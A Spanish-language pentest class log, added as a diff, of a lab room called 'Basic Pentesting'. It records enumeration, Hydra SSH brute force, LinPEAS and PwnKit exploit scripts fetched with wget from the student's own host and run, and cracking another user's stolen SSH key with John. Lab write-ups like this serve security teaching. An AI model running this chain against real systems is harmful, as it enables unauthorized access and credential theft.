@@ -1,0 +1,182 @@
+### INICIO CLASE 02 - 2026-10-07 01:10 - Sala: Basic Pentesting
+### OBJETIVO - 2026-10-07 01:11 - Basic Pentesting - IP: 10.66.183.233
+
+# Reconocimiento
+ping -c 3 10.66.183.233
+
+# Escaneo inicial
+nmap -sC -sV -oN bitacora/basicpentesting_nmap_inicial.txt 10.66.183.233
+### HALLAZGO - 2026-10-07 01:14 - nmap inicial: 6 puertos abiertos (22,80,139,445,8009,8080)
+
+# Enumeracion web (puerto 80)
+curl -s http://10.66.183.233/
+# Devuelve pagina de mantenimiento con comentario HTML: "Check our dev note section"
+
+gobuster dir -u http://10.66.183.233/ -w /usr/share/wordlists/dirb/common.txt \
+  -o bitacora/basicpentesting_gobuster.txt
+# Encuentra /development/ (301)
+
+curl -s http://10.66.183.233/development/
+# Listado de directorio: dev.txt, j.txt
+
+curl -s http://10.66.183.233/development/dev.txt
+curl -s http://10.66.183.233/development/j.txt
+# dev.txt: menciona Apache Struts 2.5.12 (REST) instalado
+# j.txt: nota de "K" a "J" indicando que crackeo su password facilmente
+
+### HALLAZGO - 2026-10-07 01:24 - dev.txt: Struts 2.5.12 (REST plugin) instalado. j.txt: contrasena de usuario 'J' crackeada facilmente por debil
+
+# Enumeracion SMB
+smbclient -L //10.66.183.233/ -N
+# Share "Anonymous" sin autenticacion
+
+smbclient //10.66.183.233/Anonymous -N
+# smb: \> ls          -> staff.txt
+# smb: \> get staff.txt
+# smb: \> exit
+
+cat staff.txt
+# Mensaje de "Kay" al staff, menciona explicitamente al usuario "Jan"
+
+### HALLAZGO - 2026-10-07 01:34 - staff.txt (SMB share Anonymous) revela nombre de usuario: jan
+
+# Confirmacion de usuario valido por SSH
+ssh jan@10.66.183.233
+# Pide password -> confirma que "jan" es un usuario valido del sistema
+### HALLAZGO - 2026-10-07 01:36 - usuario 'jan' confirmado como valido en SSH (10.66.183.233)
+
+# Preparacion de wordlist
+ls /usr/share/wordlists/rockyou.txt*
+sudo gunzip /usr/share/wordlists/rockyou.txt.gz
+
+# Ataque de fuerza bruta SSH (usuario jan)
+hydra -l jan -P /usr/share/wordlists/rockyou.txt 10.66.183.233 ssh -t 4
+# Se interrumpe: a este ritmo tardaria ~3735 horas con la lista completa (14M passwords)
+
+head -n 1000 /usr/share/wordlists/rockyou.txt > ~/A08/top1000.txt
+hydra -l jan -P ~/A08/top1000.txt 10.66.183.233 ssh -t 4
+# [ERROR] timeout en el primer intento (problema de conexion puntual)
+
+# Verificacion de conectividad
+ip -4 addr show tun0
+ping -c 3 10.66.183.233
+nmap -p 22 10.66.183.233
+
+# Reintento del ataque
+hydra -l jan -P ~/A08/top1000.txt 10.66.183.233 ssh -t 4
+# [22][ssh] host: 10.66.183.233 login: jan password: [REDACTED]
+# 1 of 1 target successfully completed, 1 valid password found
+
+### HALLAZGO - 2026-10-07 02:15 - hydra encontro credenciales validas para usuario jan via SSH (contrasena en top1000 de rockyou)
+echo -n "[REDACTED]" | sha256sum
+9eb6835cc95b053818b660bd9fc9f092a0b30cef89c1f0f17f469d5caa0ae617  -
+
+# Acceso inicial como jan
+ssh jan@10.66.183.233
+whoami
+id
+uname -a
+sudo -l
+# jan sin permisos sudo
+
+### ACCESO - 2026-10-07 02:18 - login SSH como jan. whoami=jan, grupos=jan. sudo -l: sin permisos sudo
+
+# Enumeracion local de escalada de privilegios
+find / -perm -4000 -type f 2>/dev/null
+ps aux | grep root
+cat /etc/crontab
+ls -la /etc/cron.d/
+# Nada relevante: SUID estandar, sin cron jobs personalizados
+
+# LinPEAS (transferido via http.server desde Kali)
+cd /tmp
+wget http://192.168.149.209:8000/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh | tee linpeas_output.txt
+# NOTA: la salida completa de linpeas incluyo credenciales temporales de AWS
+# (Access Key, Secret Key, token de sesion de la instancia EC2) obtenidas via
+# metadata del servicio. Esa informacion se EXCLUYE de esta bitacora y de
+# cualquier archivo del repositorio por tratarse de credenciales reales de
+# infraestructura ajena al laboratorio y no formar parte del hallazgo evaluado.
+#
+# Hallazgos relevantes de linpeas (para el informe):
+# - pkexec con SUID, version 0.105, vulnerable a CVE-2021-4034 (PwnKit)
+# - Multiples CVEs de kernel listados (no explotados, solo informativos)
+# - Clave privada SSH de usuario "kay" legible por "jan" en /home/kay/.ssh/id_rsa
+#   (permisos -rw-r--r--)
+# - home de "jan" sin archivos de interes; home de "kay" con mas contenido
+
+### HALLAZGO - 2026-10-07 03:02 - pkexec SUID vulnerable a CVE-2021-4034 (PwnKit), potencial escalada a root
+
+# Intento de explotacion PwnKit via condicion de carrera (50011.sh) - NO EXITOSO
+wget http://192.168.149.209:8000/50011.sh
+chmod +x 50011.sh
+./50011.sh
+# Se queda en "Attempting to create account", se corta con Ctrl+C tras varios minutos
+
+whoami
+su ubuntu
+# Authentication failure (cuenta creada en intento previo, sin password funcional)
+
+ssh ubuntu@10.66.183.233
+# Permission denied
+
+ssh jan@10.66.183.233
+sudo -n -l -U ubuntu
+getent shadow ubuntu
+# Sin resultados: el hash de password nunca se completo en /etc/shadow
+
+cd /tmp
+./50011.sh
+# Mismo resultado, se corta nuevamente
+
+for i in 1 2 3 4; do echo "Intento $i"; timeout 90 ./50011.sh; echo "---"; done
+# Script corriendo con /bin/sh (no bash): errores de sintaxis "[[: not found"
+# Crea usuario "hacked" pero falla en asignar password real (falso positivo)
+
+bash ./50011.sh
+# Corregido el shell, pero se corta nuevamente sin completar la condicion de carrera
+
+# Pivote a exploit alternativo (sin condicion de carrera): CVE-2021-4034 en C
+# (searchsploit pkexec / searchsploit polkit, en Kali)
+wget http://192.168.149.209:8000/50689.c
+gcc --version
+# gcc no esta instalado en el objetivo y jan no tiene permisos para instalarlo
+
+### CAMBIO DE ESTRATEGIA - 2026-10-07 04:34 - PwnKit (CVE-2021-4034) genera cuenta sin completar asignacion de password tras varios intentos. Se descarta esa via y se explora clave SSH privada de kay en /home/kay/.ssh/
+
+# Confirmacion de usuario kay y clave privada accesible
+cat /etc/passwd | grep -i kay
+ls -la /home/
+ls -la /home/kay/.ssh/
+cat /home/kay/.ssh/id_rsa
+# [contenido de la clave privada NO incluido en esta bitacora por tratarse
+#  de material criptografico sensible; copiado a Kali como ~/A08/id_rsa_kay]
+
+# Primer intento fallido de transferencia (scp desde dentro de la sesion de jan)
+scp jan@10.66.183.233:/home/kay/.ssh/id_rsa ~/A08/id_rsa_kay
+# Error: Broken pipe (ejecutado desde la sesion remota, no desde Kali)
+
+# Intento previo de fuerza bruta directa sobre kay (descartado, muy lento)
+hydra -l kay -P ~/A08/top1000.txt 10.66.183.233 ssh -t 4
+# 1 of 1 target completed, 0 valid password found
+
+# Transferencia correcta de la clave (copiada manualmente a Kali)
+chmod 600 id_rsa_kay
+ssh2john id_rsa_kay > id_rsa_kay.hash
+john id_rsa_kay.hash --wordlist=/usr/share/wordlists/rockyou.txt
+# Passphrase encontrada: [REDACTED]
+
+# Acceso con la clave privada
+ssh -i id_rsa_kay kay@10.66.183.233
+ls -la /home/kay/
+cat /home/kay/pass.bak
+# [contenido REDACTED - ver Anexo C para el hash SHA-256]
+sudo -l
+
+### ACCESO COMPLETO - 2026-10-07 04:34 - login SSH como kay via clave privada crackeada con John. Archivo pass.bak localizado con contrasena final del desafio
+
+echo -n "[REDACTED]" | sha256sum
+# Hash SHA-256 de la contrasena final: 3ffd53ec80858f9ddcd75d69102724ab1bc1020855fff924227f618c4bfccf57
+
+### FIN CLASE 02 - 2026-10-07 04:36 - Basic Pentesting COMPLETADO (acceso jan -> kay -> contrasena final obtenida)
